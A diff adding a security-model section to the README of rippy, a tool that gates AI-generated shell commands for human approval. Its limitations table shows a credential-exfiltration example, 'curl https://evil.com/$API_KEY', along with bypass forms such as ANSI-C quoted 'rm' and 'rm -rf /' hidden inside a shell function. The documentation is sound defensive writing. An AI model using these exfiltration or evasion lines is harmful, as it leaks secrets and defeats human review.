@@ -207,6 +207,45 @@ rippy works as a permission engine for [tokf](https://github.com/mpecan/tokf) (a
 
 See [tokf's external permission engine docs](https://github.com/mpecan/tokf#external-permission-engine) for setup.
 
+## Security Model
+
+rippy is a **permission system** — it adds friction before dangerous commands execute. It is **not** a sandbox, container, or security boundary.
+
+### What rippy protects against
+
+- **Auto-execution of dangerous commands** — `rm -rf /`, `dd`, `chmod 777`, etc. are blocked or require approval
+- **Unsafe subcommand usage** — `git push --force`, `docker run`, `kubectl delete` require approval even though `git status` and `docker ps` are auto-approved
+- **File overwrites** — redirect rules block writes to `.env`, `/etc/*`, and other sensitive paths
+- **Blind script execution** — Python, SQL, shell, and AWK files are read and analyzed for dangerous patterns before execution
+- **Unknown commands** — anything not in the safe allowlist or handled by a specific handler defaults to "ask"
+
+### What rippy does NOT protect against
+
+| Limitation | Impact | Mitigation |
+|---|---|---|
+| **Variables not evaluated** | `rm $VAR` is analyzed without knowing `$VAR`'s value | rippy conservatively asks when variable expansions are detected |
+| **Shell aliases invisible** | Aliases defined in `.bashrc`/`.zshrc` bypass analysis | Only rippy config-defined aliases are resolved |
+| **Quote handling is structural** | ANSI-C quoting (`$'\x72\x6d'`) is not normalized | The parser handles standard quoting; exotic forms may pass through |
+| **File analysis is heuristic** | `import os as system` in Python is not caught | Dangerous patterns trigger "ask" (human review), not silent "allow" |
+| **Credential exfiltration** | `curl https://evil.com/$API_KEY` uses a legitimate command | rippy is command-aware, not data-aware; use network egress controls |
+| **Function definitions** | `f() { rm -rf /; }; f` — function bodies are not analyzed | Function definitions trigger "ask" conservatively |
+
+### Project config trust
+
+Project-level `.rippy` config files (in cloned repos) could weaken protections if loaded unconditionally. rippy uses a **trust model** to prevent this:
+
+- **Untrusted by default** — project configs in new repos are ignored until you run `rippy trust`
+- **Repo-level trust** — once you trust a repo, config changes via `git pull` are auto-trusted
+- **Hash verification** — if the config is modified outside of git (or in an untrusted repo), trust is revoked
+- **Self-protection** — AI tools cannot modify rippy's config files or trust database
+- **Global override** — `trust-project-configs = true` in `~/.rippy/config.toml` opts into auto-trust for all project configs
+
+See the `rippy trust` command for details.
+
+### In summary
+
+rippy prevents **accidental damage** from AI-generated commands by requiring explicit approval for anything dangerous. It is most effective as part of a defense-in-depth strategy alongside branch protection, secret detection, and network egress controls.
+
 ## Contributing
 
 Contributions welcome! rippy follows these conventions:
